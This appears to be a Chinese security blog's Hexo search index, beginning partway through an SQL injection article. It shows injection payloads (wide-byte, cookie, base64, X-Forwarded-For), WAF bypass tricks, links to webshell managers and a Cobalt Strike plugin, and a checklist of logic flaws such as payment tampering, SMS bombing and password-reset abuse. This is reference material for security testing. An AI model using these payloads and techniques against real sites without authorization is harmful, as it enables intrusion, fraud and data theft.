href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><pre><code class="mysql">id = -1%DF&#39; union select 1,user(),3,%23</code></pre><p>在上述条件下，单引号’被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。</p><pre><code class="mysql">Cookie: id = 1 and 1=1</code></pre><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>对参数进行base64编码，再发送请求。</p><p>说明：id=1’，1的base64编码为<code>MSc=</code>，而<code>=</code>的url编码为<code>%3d</code>，所以得到以下结果：</p><pre><code class="mysql">id=MSc%3d</code></pre><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p><pre><code class="mysql">X-Forward-For：127.0.0.1&#39; select 1,2,user()</code></pre><h2 id="0x07-SQL注入绕过技术"><a href="#0x07-SQL注入绕过技术" class="headerlink" title="0x07 SQL注入绕过技术"></a>0x07 SQL注入绕过技术</h2><ul><li><p><strong>大小写绕过</strong></p></li><li><p><strong>双写绕过</strong></p></li><li><p><strong>编码绕过</strong>（url全编码、十六进制）</p></li><li><p><strong>内联注释绕过</strong></p></li><li><p><strong>关键字替换</strong></p></li><li><ul><li><p><strong>逗号绕过</strong></p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p></li><li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p></li><li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p></li><li><p><strong>空格绕过</strong>（用括号，+等绕过）</p></li></ul></li><li><p><strong>等价函数绕过</strong></p></li><li><ul><li>hex()、bin()=ascii()</li><li>concat_ws()=group_concat()</li><li>mid()、substr()=substring()</li></ul></li><li><p><strong>http参数污染</strong>（<code>id=1 union select+1,2,3+from+users+where+id=1–</code>变为<code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code>）</p><blockquote><p><strong>原文链接：乌云安全</strong></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应脑图</title>
      <link href="/2020/04/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%91%E5%9B%BE/"/>
      <url>/2020/04/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%91%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d787a45ba16223bfef3d6c98f8e042a0a49667e60ca42fc1ef010580bad70f89">dfda002aaff236cc0f0454061e8472d9e59f7084dc433d868207578ec637c12670f5c695fc36f4701745b5412373029c256cf0adf8db5b8adbb299aabed80fa29e73b0b1bbc65ae1525bb157cdd54bafb117d5e6a7f6889793fecd4bd03f2d425576677e19f1bbcade25831fae254dbd677a6b7f2d380f624a2d749426693adeb3076a649588b454e11d206a007dae200d76eb0ba3f9b108ba2247c196daea596341c1fad9535d2099a2818f6dcb04b5a6ec8fec862143bfa355f86c6da7454fa88c2b3f6932d5f2e7bfd496fb4cb3f109927e2a3c2ff84eb3b4c02e8f322a6eabbe6c8852c0e51f0f6ba221563767dddb36e6b02ce04d4ced1337ce2ce380587269840bbfc05e590468d6654aef7cf1a5e4fa1a16c60637a173e15876419979d6fbb6d9aa5a8bcabd8bac22949c3b39b7b35465c70fea9c3aee9ac8f48c9dcee2c121fb4f1457b034d2971c739132cc4b3170a49fe137c45a4a71876091b0dc905fb813954424ff1b3a8e383c8c09386dc80a73f5755987b1b8f8e2af0b3e1c1d67072772c1179e5270734f4d633d5157562c6df763e6fa1d6707912e0bc924ac79768e2170be363778de4bfe61b14c187abdd385ae6a643a6d343f2bf5270e994dd30fc1484a154b6ed06326c4e3c9a08cfa4025ba914d23ffa96735ccaa67241481174604fc355774ef1e2b2715855b1dfeb5b77fd6aff7bc3da89c92f211</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用工具汇总</title>
      <link href="/2020/03/16/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
      <url>/2020/03/16/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="Webshell管理工具"><a href="#Webshell管理工具" class="headerlink" title="Webshell管理工具"></a>Webshell管理工具</h2><p><strong>蚁剑：</strong><a href="https://github.com/AntSwordProject/AntSword-Loader">下载地址</a></p><p><strong>冰蝎：</strong><a href="https://github.com/rebeyond/Behinder">下载地址</a></p><p><strong>哥斯拉:</strong><a href="https://github.com/BeichenDream/Godzilla">下载地址</a></p><h2 id="快速资产探测"><a href="#快速资产探测" class="headerlink" title="快速资产探测"></a>快速资产探测</h2><p><strong>Goby：</strong><a href="https://gobies.org/">下载地址</a></p><p><strong>w12scan</strong>:<a href="https://github.com/w-digital-scanner/w12scan">下载地址</a></p><h2 id="代理搭建工具"><a href="#代理搭建工具" class="headerlink" title="代理搭建工具"></a>代理搭建工具</h2><p><strong>trojan：</strong><a href="https://github.com/trojan-gfw/trojan">下载地址</a></p><p><strong>v2rayN：</strong><a href="https://github.com/2dust/v2rayN">下载地址</a></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p><strong>layer挖掘机：</strong></p><p><strong>oneforall：</strong><a href="https://github.com/shmilylty/OneForAll">下载地址</a></p><h2 id="快速漏洞检测"><a href="#快速漏洞检测" class="headerlink" title="快速漏洞检测"></a>快速漏洞检测</h2><p><strong>Struts2：</strong><a href="https://github.com/HatBoy/Struts2-Scan">下载地址</a></p><p><strong>Weblogic：</strong><a href="https://github.com/rabbitmask/WeblogicScan">下载地址</a></p><p><strong>Shiro：</strong><a href="https://github.com/fupinglee/ShiroScan">下载地址</a></p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p><strong>Ladon（集合）：</strong><a href="https://github.com/k8gege/Ladon">下载地址</a></p><p><strong>CS插件：</strong><a href="https://github.com/pandasec888/taowu-cobalt-strike">下载地址</a></p><h2 id="Burp插件"><a href="#Burp插件" class="headerlink" title="Burp插件"></a>Burp插件</h2><p><strong>Shiro自动检测：</strong><a href="https://github.com/amad3u4/ShiroScanner">下载地址</a></p><p>持续更新……..</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞总结</title>
      <link href="/2020/02/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2020/02/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a><strong>注册</strong></h2><p>可能存在漏洞：</p><ol><li>任意用户注册</li><li>短信轰炸/验证码安全问题/密码爆破</li><li>批量注册用户</li><li>枚举用户名/进行爆破</li><li>SQL注入/存储型XSS</li></ol><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a><strong>登陆</strong></h2><ol><li>短信轰炸/验证码安全问题/密码爆破</li><li>SQL注入</li><li>可被撞库</li><li>空密码绕过/抓包把password字段修改成空值发送</li><li>认证凭证替换/比如返回的数据包中包含账号，修改账号就能登陆其他账号</li><li>权限绕过/Cookie仿冒</li><li>第三方登陆，可以修改返回包的相关数据，可能会登陆到其他的用户</li></ol><h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a><strong>密码找回</strong></h2><ol><li>短信邮箱轰炸/短信邮箱劫持</li><li>重置任意用户密码/验证码手机用户未统一验证</li><li>批量重置用户密码</li><li>新密码劫持/直接跳过验证步骤</li><li>本地验证，修改返回值</li></ol><h2 id="购买支付-充值"><a href="#购买支付-充值" class="headerlink" title="购买支付/充值"></a><strong>购买支付/充值</strong></h2><ol><li>交易金额/数量修改，交易金额不一定非要0.01，有时候1.00也行</li><li>交易信息订单编码/导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>请求重放多次下单，高并发操作</li><li>如果返回当参数中有一些奇怪的参数，可以把这个而参数添加到请求包中然后重发</li></ol><h2 id="抽奖活动"><a href="#抽奖活动" class="headerlink" title="抽奖活动"></a><strong>抽奖活动</strong></h2><ol><li>抽奖作弊</li><li>刷奖品/积分</li><li>高并发点击，在签到，转账，兑换，购买业务可以试一试</li></ol><h2 id="优惠券-代金券"><a href="#优惠券-代金券" class="headerlink" title="优惠券/代金券"></a><strong>优惠券/代金券</strong></h2><ol><li>刷优惠券/代金券</li><li>修改优惠券金额/数量</li></ol><h2 id="运费"><a href="#运费" class="headerlink" title="运费"></a><strong>运费</strong></h2><ol><li>修改运费金额</li></ol><h2 id="订单信息"><a href="#订单信息" class="headerlink" title="订单信息"></a><strong>订单信息</strong></h2><ol><li>订单信息遍历/泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删除他人订单</li></ol><h2 id="会员系统"><a href="#会员系统" class="headerlink" title="会员系统"></a><strong>会员系统</strong></h2><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx/docx，可能存在xxe，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4(视频按帧分割成图片),上传恶意avi盲测ssrf</li><li>用户横向越权访问/遍历/导致用户信息泄露</li><li>SQL注入/个人简介处存储XSS</li></ol><h2 id="传输过程"><a href="#传输过程" class="headerlink" title="传输过程"></a><strong>传输过程</strong></h2><ol><li>明文传输账号密码</li><li>修改信息处无session/token导致csrf</li><li>POST/COOKIE注入</li></ol><h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a><strong>评论</strong></h2><ol><li>POST注入/存储XSS</li><li>无session/token导致CSRF</li></ol><h1 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处"></a><strong>漏洞处</strong></h1><h2 id="验证码问题"><a href="#验证码问题" class="headerlink" title="验证码问题"></a><strong>验证码问题</strong></h2><ol><li>万能验证码0000，8888，1234</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a><strong>短信轰炸</strong></h2><ol><li>重放数据包</li><li>删除修改cookie，或者检测数据包是否有相关参数，直接删除或者修改，然后重放数据包</li><li>手机号前面加 +86，或者手机号后面加空格之类的，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id=1</li><li>一个站的登陆处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果存在批量注册用户的话，每个用户可以发送短信5次，也能实现批量轰炸</li></ol><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a><strong>水平越权</strong></h2><ol><li>主要登陆后还是修改参数，主要找到<strong>多个接口</strong>不断测试</li><li>关注网页源代码，有时候会有表单，但是被bidden(隐藏标签)给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol><h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a><strong>数据泄露</strong></h2><ol><li>在找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</li></ol><h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a><strong>任意用户密码重置</strong></h2><ol><li>目前大部分都是在修改密码处参数修改，将用户名的参数修改成其他用户名</li><li>有些是通过前端验证，使用bp修改返回数据包，如何才能知道正确的数据包是怎么样的？直接试一试不就知道了- –</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo基本操作</title>
      <link href="/2020/02/05/Hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/02/05/Hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>hexo g：生成静态文件</p><p>hexo d：发布GITHUB</p><p>hexo s：本地开启服务默认4000端口</p><p>hexo new post title ：新建一个文章</p><p>hexo clean : 清理缓存</p><p>这几个够用了，之后在补充</p><h2 id="好用插件："><a href="#好用插件：" class="headerlink" title="好用插件："></a>好用插件：</h2><p>hexo-asset-image 本地图片引用（之前坑太多了，版本问题会导致不兼容）</p><p>hexo-blog-encrypt 文章加密</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
